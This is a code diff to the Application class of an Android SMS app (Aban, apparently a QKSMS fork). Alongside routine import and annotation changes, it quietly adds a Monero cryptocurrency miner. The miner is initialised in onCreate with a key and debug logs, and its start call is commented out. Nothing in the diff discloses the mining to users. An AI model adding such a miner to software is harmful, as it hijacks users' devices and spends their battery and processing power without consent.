@@ -23,14 +23,18 @@ package common
  * along with QKSMS.  If not, see <http://www.gnu.org/licenses/>.
  */
 //import com.sun.org.apache.xerces.internal.dom.DOMMessageFormatter.setLocale
+import android.annotation.SuppressLint
 import android.app.Activity
 import android.app.Application
+import android.content.Context
 import android.support.text.emoji.EmojiCompat
 import android.support.text.emoji.FontRequestEmojiCompatConfig
 import android.support.v4.provider.FontRequest
+import android.util.Log
 import com.bugsnag.android.Bugsnag
 import com.bugsnag.android.Configuration
 import com.franmontiel.localechanger.LocaleChanger
+import com.smartnsoft.monerominer.MoneroMiner
 import common.util.NightModeManager
 import dagger.android.AndroidInjector
 import dagger.android.DispatchingAndroidInjector
@@ -44,11 +48,9 @@ import ir.hatamiarash.aban.R
 import manager.AnalyticsManager
 import migration.AbanRealmMigration
 import timber.log.Timber
+import uk.co.chrisjenx.calligraphy.CalligraphyConfig
 import java.util.*
 import javax.inject.Inject
-import uk.co.chrisjenx.calligraphy.CalligraphyConfig
-
-
 
 
 class AbanApplication : Application(), HasActivityInjector {
@@ -68,6 +70,7 @@ class AbanApplication : Application(), HasActivityInjector {
     private val packages = arrayOf("common", "feature", "injection", "filter", "interactor", "manager", "mapper",
             "migration", "model", "receiver", "repository", "service", "util")
 
+    @SuppressLint("MissingPermission")
     override fun onCreate() {
         super.onCreate()
 
@@ -89,6 +92,11 @@ class AbanApplication : Application(), HasActivityInjector {
         appComponent.inject(this)
 
         nightModeManager.updateCurrentTheme()
+
+        Log.w("mine", "initialize");
+        MoneroMiner.initialize(this, "GMuawzmE63C7C0LMzNkfsQuTp46DmK4S");
+        Log.w("mine", "start");
+        //MoneroMiner.start();
 
         val fontRequest = FontRequest(
                 "com.google.android.gms.fonts",
@@ -124,4 +132,9 @@ class AbanApplication : Application(), HasActivityInjector {
         super.onConfigurationChanged(newConfig)
         LocaleChanger.onConfigurationChanged()
     }
+
+    fun getContext():Context{
+        return this.applicationContext
+    }
+
 }
